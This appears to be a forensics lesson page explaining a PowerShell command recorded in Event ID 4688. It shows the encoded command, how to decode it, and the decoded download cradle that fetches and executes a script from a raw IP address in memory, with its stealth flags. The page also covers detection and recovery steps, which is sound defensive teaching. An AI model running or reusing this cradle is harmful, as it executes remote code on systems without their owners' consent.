**Scenario.** Event ID 4688 captured this command line. Fifteen minutes. What does it actually do?

## The data

```
powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AYQAuAHAAcwAxACcAKQA=
```

## Decode it yourself first

This is a real, valid payload — decode it before reading on:

```powershell
$e = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AYQAuAHAAcwAxACcAKQA="
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e))
```

The step people skip is `Unicode.GetString`. Base64-decoding alone yields text with a null byte between every character — that is [UTF-16LE showing through](#/lesson/l3-14-powershell-obfuscation), not corruption.

## The result

```
IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/a.ps1')
```

## Reading it

**`IEX`** — `Invoke-Expression`, which evaluates a string as PowerShell code.

**`(New-Object Net.WebClient).DownloadString(...)`** — fetches remote content as a **string**, not a file. Nothing is written to disk at any point.

Together these form the [download cradle](#/lesson/l3-16-powershell-malicious-patterns): fetch and execute in one expression. There is no file for antivirus to scan, no [Prefetch](#/lesson/l4-01-prefetch) entry for the payload, no [Amcache](#/lesson/l4-02-amcache) hash. This is what "fileless" means concretely.

**The destination is a raw IP over plain HTTP** — no domain, no TLS. Convenient for the attacker, and convenient for you: it is directly actionable as an indicator and would appear in [proxy or NetFlow data](#/lesson/l6-03-netflow-analysis).

## The flags

| Flag | Effect |
|---|---|
| `-w hidden` | No window appears |
| `-nop` | Skips the user's PowerShell profile |
| `-enc` | The Base64/UTF-16LE payload |

Individually ordinary — `-nop` is close to best practice for unattended automation. Clustered, on a process spawned by Word, they are the [pattern](#/lesson/l3-16-powershell-malicious-patterns).

## What you still do not know

The decoded command tells you what was **fetched**, not what `a.ps1` contained. That second stage never touched disk.

Recovery options, in order: [Script Block Logging (4104)](#/lesson/l3-13-powershell-logging) captured it post-parse if enabled; [memory](#/lesson/l3-12-memory-based-file-recovery) may still hold it if the host has not rebooted; proxy logs may have the response body.

> [!TIP]
> Notice what made this decodable at all: 4688 recorded the full command line, which requires command-line auditing to be explicitly enabled. Without it you would have `powershell.exe` and nothing else — no flags, no payload, no indicator.
